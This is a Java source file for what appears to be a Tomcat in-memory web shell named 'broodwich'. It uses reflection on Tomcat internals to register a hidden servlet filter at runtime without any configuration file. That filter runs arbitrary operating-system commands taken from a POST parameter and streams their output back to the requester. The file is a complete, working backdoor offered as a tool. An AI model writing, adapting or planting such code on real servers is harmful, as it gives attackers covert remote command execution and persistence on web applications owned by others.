package party.itistimeto.broodwich;

import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Map;

public class Dropper implements javax.servlet.Filter {
    public static final java.lang.String moduleIdKey = "broodwichModule";
    public static final java.lang.String moduleParamsKey = "broodwichParams";
    private static final java.lang.String filterName = "broodwich";

    private static void addFilter(Filter filter, String pattern) {
        // todo: beyond tomcat
        // TODO: this is for (some versions of?) tomcat, add spring, jetty, legacy servlet api (?), etc
        StandardContext standardContext = (StandardContext) ((WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()).getResources().getContext();

        if (!standardContext.getServletContext().getFilterRegistrations().containsKey(filterName)) {
            try {
                // 2. to add the filter, we need to use StandardContext's public methods addFilterDef and
                // addFilterMap, as well as manipulate its filterConfigs map directly; filter configs require
                // use of a protected constructor
                java.lang.reflect.Constructor afcConstructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, org.apache.tomcat.util.descriptor.web.FilterDef.class);
                afcConstructor.setAccessible(true);
                java.lang.reflect.Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
                filterConfigsField.setAccessible(true);

                // create filter definition
                org.apache.tomcat.util.descriptor.web.FilterDef filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
                filterDef.setFilterName(filterName);
                filterDef.setFilter(filter);

                // create filter map
                org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
                filterMap.setFilterName(filterName);
                filterMap.addURLPattern(pattern);
                // TODO: or should we use "upper" context?
                for(String servletName : standardContext.getServletContext().getServletRegistrations().keySet()) {
                    filterMap.addServletName(servletName);
                }
                filterMap.setDispatcher(javax.servlet.DispatcherType.REQUEST.name());

                // create filter config
                org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) afcConstructor.newInstance(standardContext, filterDef);

                // add definition, map, and config, synchronized on context's config map
                // todo: will this lock requests on high-traffic server? hopefully light enough that it won't
                java.util.Map<String, org.apache.catalina.core.ApplicationFilterConfig> filterConfigs = (java.util.Map<String, org.apache.catalina.core.ApplicationFilterConfig>) filterConfigsField.get(standardContext);
                synchronized (filterConfigsField.get(standardContext)) {
                    // TODO: do we need to use addFilterDef?
                    standardContext.addFilterDef(filterDef);
                    standardContext.addFilterMap(filterMap);
                    filterConfigs.put(filterName, filterConfig);
                }
            } catch (java.lang.ReflectiveOperationException e) {
                e.printStackTrace();
            }
    }}

    public static void taste(String pattern) {
        Dropper.addFilter(new Dropper(), pattern);
    }

    private Dropper() {
        super();
    }

    @Override
    public void init(javax.servlet.FilterConfig filterConfig) throws javax.servlet.ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws java.io.IOException, javax.servlet.ServletException {
        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
        Map<String, String[]> parameterMap = httpServletRequest.getParameterMap();
        if(httpServletRequest.getMethod().equals("POST") && parameterMap.containsKey(Dropper.moduleIdKey)) {
            String moduleId = httpServletRequest.getParameter(Dropper.moduleIdKey);
            if(moduleId.equals("exec") && parameterMap.containsKey(Dropper.moduleParamsKey)) {
                // TODO: support stderr as well
                InputStream stdout = Runtime.getRuntime().exec(httpServletRequest.getParameter(Dropper.moduleParamsKey)).getInputStream();
                OutputStream respout = servletResponse.getOutputStream();
                byte[] buf = new byte[1024];
                int n = 0;
                while((n = stdout.read(buf)) > 0) {
                    respout.write(buf, 0, n);
                }
            }
            else if(moduleId.equals("check")) {
                servletResponse.getWriter().println("beware...");
            }
        }
    }

    @Override
    public void destroy() {

    }
}